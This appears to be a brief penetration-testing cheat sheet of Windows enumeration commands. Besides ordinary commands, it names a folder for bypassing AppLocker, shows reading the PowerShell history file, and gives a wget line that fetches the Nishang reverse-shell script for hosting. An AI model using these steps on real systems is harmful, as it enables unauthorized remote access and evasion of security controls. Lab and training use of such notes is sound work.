# Windows Commands
Essential commands for Windows enumeration and interaction

## Useful Commands

### View file content
```powershell copy
type secret.txt
```
- Displays the content of `secret.txt` in the terminal.

### Check PowerShell history
```powershell copy
type $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
- Shows PowerShell command history for the current user.

### AppLocker bypass default folder
```powershell copy
cd C:\Windows\System32\spool\drivers\color
```
- Changes to a folder often writable for AppLocker bypass.

## Enumeration

### Check user privileges
```powershell copy
whoami /priv
```
- Lists the current user’s privileges (e.g., SeDebugPrivilege).
- `/priv`: Displays privilege information.

### Start Python HTTP server
```bash copy
python3 -m http.server 80
```
- Runs an HTTP server on port 80 to host files.
- `-m http.server 80`: Runs HTTP server on port 80.



### Download PowerShell reverse shell
```bash copy
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```
- Downloads the Invoke-PowerShellTcp.ps1 script for a reverse shell.